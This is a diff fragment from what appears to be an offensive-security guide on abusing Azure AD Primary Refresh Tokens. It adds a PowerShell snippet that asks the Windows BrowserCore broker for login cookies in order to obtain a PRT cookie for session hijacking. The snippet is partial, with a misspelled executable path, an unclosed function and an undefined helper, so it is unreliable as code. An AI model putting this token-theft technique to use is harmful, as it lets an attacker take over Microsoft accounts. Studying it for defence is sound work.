@@ -48,6 +48,23 @@ Use the Primary Refresh Token together with the Proof of Possession Key to digit
 
 ## Alternate Method: Browser Core
 
+### 1) Request.ps1 
+
+    function Main
+    {
+        $request = '
+        {
+            "method":"GetCookies",
+            "uri":"https://login.microsoftonline.com/common/oauth2/authorize",
+            "sender":"https://login.microsoftonline.com"
+        }'
+
+        $broker = "$env:ProgramFiles\Windows Security\BrowserCore\brosercore.exe"
+
+        $response = Invoke-Broker -BrokerPath $broker -Request $request
+
+        $response
+
 ### 1) 
 
 ### 6) Use the PRT cookie
